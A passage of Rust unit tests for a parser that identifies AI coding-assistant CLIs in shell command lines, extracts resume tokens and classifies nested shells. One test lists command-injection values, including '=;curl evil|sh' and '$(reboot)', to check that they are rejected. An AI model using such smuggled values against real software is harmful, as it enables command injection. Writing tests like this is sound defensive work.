            ("env -u X claude".into(), Some("claude"), None),
            ("env -uX claude".into(), Some("claude"), None),
            ("env --unset X claude".into(), Some("claude"), None),
            ("env --unset=X claude".into(), Some("claude"), None),
            ("env -i claude".into(), Some("claude"), None),
            ("env - claude".into(), Some("claude"), None),
            ("env --ignore-environment FOO=1 claude".into(), Some("claude"), None),
            ("env -- claude".into(), Some("claude"), None),
            ("/usr/bin/env FOO=1 claude".into(), Some("claude"), None),
            ("FOO=1 env BAR=2 claude".into(), Some("claude"), None),
            // UNGATEABLE env flags degrade to None rather than guess: -S
            // re-tokenises the rest of the line, -C/--chdir moves the cwd we
            // would report, and the rest are simply not modelled.
            ("env -S 'claude --resume x'".into(), None, None),
            ("env --split-string='claude'".into(), None, None),
            ("env -C /tmp claude".into(), None, None),
            ("env --chdir=/tmp claude".into(), None, None),
            ("env -0 claude".into(), None, None),
            ("env --debug claude".into(), None, None),
            // `env` with no command, and a value-flag with no value.
            ("env".into(), None, None),
            ("env FOO=1".into(), None, None),
            ("env -u".into(), None, None),
            ("env -i".into(), None, None),
            // Not assignments: an invalid NAME, a flag, a quoted word.
            ("1FOO=1 claude".into(), None, None),
            ("-x=1 claude".into(), None, None),
            ("echo FOO=1 claude".into(), None, None),
            // A prefix in front of a NON-adapter is still nothing.
            ("IS_SANDBOX=1 git status".into(), None, None),
            // Unchanged lines stay byte-identical in verdict.
            (format!("claude --resume {u}"), Some("claude"), Some(u.clone())),
            ("claude".into(), Some("claude"), None),
            ("git status".into(), None, None),
        ];
        for (line, adapter, token) in &cases {
            let got = analyze_cmdline(line, cwd);
            assert_eq!(
                got.as_ref().map(|c| c.adapter.as_str()),
                *adapter,
                "adapter for {line:?}"
            );
            assert_eq!(
                got.as_ref().and_then(|c| c.resume_token.clone()),
                *token,
                "token for {line:?}"
            );
        }
        // The field line's identity in full: attributed, token-less, and
        // honestly Ambiguous (D11 sanitize) — attribution ALONE is what the
        // strip collapse and the keyboard ownership need.
        let cli = analyze_cmdline("IS_SANDBOX=1 claude --dangerously-skip-permissions", cwd)
            .expect("the field line must attribute");
        assert_eq!(cli.adapter, "claude");
        assert_eq!(cli.resume_token, None);
        assert_eq!(cli.confidence, CliConfidence::Ambiguous);
        assert!(!cli.nested);
        assert_eq!(cli.cwd, cwd);
        // ...and through the `cd '<dir>' && <cli>` compound shape too.
        let cli = analyze_cmdline_with_cd(
            "cd '/srv/app' && IS_SANDBOX=1 claude --dangerously-skip-permissions",
            cwd,
        )
        .expect("prefix + cd head must attribute");
        assert_eq!(cli.adapter, "claude");
        assert_eq!(cli.cwd, Path::new("/srv/app"));
    }

    /// env-prefix-cli — the SAME skip in the nested-shell / crossing
    /// classifiers. They are always evaluated as a pair
    /// (`nested_shell_cmd(cmd) && crosses_to_posix(cmd)`), so a prefix only
    /// one of them saw would strand the hook injection the CLI attribution
    /// then depends on.
    #[test]
    fn env_prefix_nested_shell_matrix() {
        // (line, nested shell?, crosses to POSIX?)
        let cases: &[(&str, bool, bool)] = &[
            ("IS_SANDBOX=1 sudo su", true, false),
            ("A=1 B=2 su - deploy", true, false),
            ("FOO=1 bash", true, false),
            ("env FOO=1 sudo su", true, false),
            ("env -u X sudo su", true, false),
            ("FOO=1 ssh h.example.com", true, true),
            ("env FOO=1 wsl", true, true),
            ("FOO=1 docker exec -it c bash", true, true),
            // Ungateable env flags degrade to false in BOTH.
            ("env -S 'sudo su' x", false, false),
            ("env --chdir=/tmp sudo su", false, false),
            // Prefix in front of a finite command, and prefix alone.
            ("FOO=1 ls -la", false, false),
            ("FOO=1", false, false),
            ("IS_SANDBOX=1 claude --dangerously-skip-permissions", false, false),
            // Unchanged verdicts.
            ("sudo su", true, false),
            ("ssh h.example.com", true, true),
            ("ls", false, false),
        ];
        for (line, nested, crosses) in cases {
            assert_eq!(nested_shell_cmd(line), *nested, "nested for {line:?}");
            assert_eq!(crosses_to_posix(line), *crosses, "crosses for {line:?}");
        }
    }

    /// D11 (remote-cli-resume-spec): a colliding LOCAL store — a real dir
    /// under the local ~/.claude/projects named like the munge of a REMOTE
    /// posix cwd — must never mint a token through the remote analysis
    /// path, even though the raw extract fn would happily correlate it.
    #[test]
    fn d11_remote_analysis_never_mints_local_fs_tokens() {
        let Some(home) = dirs::home_dir() else {
            return; // no home, no hazard to stage
        };
        let cwd = format!("/tmp/tc-d11-{}", std::process::id());
        let munged = claude_project_dir_name(Path::new(&cwd));
        let dir = home.join(".claude").join("projects").join(&munged);
        std::fs::create_dir_all(&dir).unwrap();
        let u = Uuid::new_v4();
        std::fs::write(dir.join(format!("{u}.jsonl")), b"x").unwrap();
        // Sanity: the raw extract WOULD correlate from the staged local
        // store (the exact D11 hazard).
        let (tok, conf) = claude_extract(&s(&["claude"]), Path::new(&cwd), None);
        assert_eq!(tok, Some(u.to_string()));
        assert_eq!(conf, CliConfidence::Correlated);
        // The remote/hook analysis sanitizes it: Explicit-or-nothing.
        let cli = analyze_cmdline("claude", Path::new(&cwd)).unwrap();
        assert_eq!(cli.resume_token, None);
        assert_eq!(cli.confidence, CliConfidence::Ambiguous);
        // Explicit argv still passes through untouched.
        let cli = analyze_cmdline(&format!("claude --resume {u}"), Path::new(&cwd)).unwrap();
        assert_eq!(cli.resume_token, Some(u.to_string()));
        assert_eq!(cli.confidence, CliConfidence::Explicit);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn split_cmdline_quoting() {
        assert_eq!(
            split_cmdline("claude --resume abc"),
            vec!["claude", "--resume", "abc"]
        );
        assert_eq!(
            split_cmdline("'/opt/a b/claude' -x \"two words\""),
            vec!["/opt/a b/claude", "-x", "two words"]
        );
        assert_eq!(split_cmdline("a\\ b c"), vec!["a b", "c"]);
        assert_eq!(split_cmdline("  "), Vec::<String>::new());
        assert_eq!(split_cmdline("''"), vec![""]);
    }

    #[test]
    fn restore_templates() {
        assert_eq!(
            restore_trailing("codex", Some("u-1")),
            Some("codex resume u-1".into())
        );
        assert_eq!(
            restore_trailing("goose", Some("20260702_1")),
            Some("goose session --resume --session-id 20260702_1".into())
        );
        assert_eq!(restore_trailing("gemini", None), Some("gemini --resume".into()));
        assert_eq!(
            restore_trailing("aider", None),
            Some("aider --restore-chat-history".into())
        );
        assert_eq!(restore_trailing("codex", None), None);
        assert_eq!(restore_trailing("unknown", Some("x")), None);
    }

    /// r3-S1: hostile tokens must die at capture (`flag_token`) AND at the
    /// restore choke point (`restore_trailing`) — the trailings' `'`-refusal
    /// does not stop any of these, and the token is spliced unquoted.
    #[test]
    fn hostile_resume_tokens_refused() {
        for bad in [
            "=;curl evil|sh",
            "$(reboot)",
            "`reboot`",
            "a b",
            "x\ny",
            "tok'en",
            "cmd&calc",
            "a\"b",
            "<x>",
            "-r",
            "",
        ] {
            assert!(!safe_resume_token(bad), "{bad:?} accepted");
            assert_eq!(restore_trailing("goose", Some(bad)), None, "{bad:?} spliced");
            assert_eq!(
                flag_token(&s(&["goose", "--session-id", bad]), &["--session-id"]),
                None,
                "{bad:?} captured"
            );
        }
        assert!(!safe_resume_token(&"a".repeat(129)), "length cap");
        // Every real token shape stays accepted end-to-end.
        for ok in [
            "0e3a3f2a-6f2b-4d0c-9e3e-8f6d2b1c0a9e",
            "T-abc123",
            "20260702_1",
            "rollout-2026.07.02:x@y",
        ] {
            assert!(safe_resume_token(ok), "{ok:?} refused");
            assert_eq!(
                flag_token(&s(&["goose", "--session-id", ok]), &["--session-id"]),
                Some(ok.to_string())
            );
        }
        assert!(restore_trailing("goose", Some("sess_1")).is_some());
    }
}
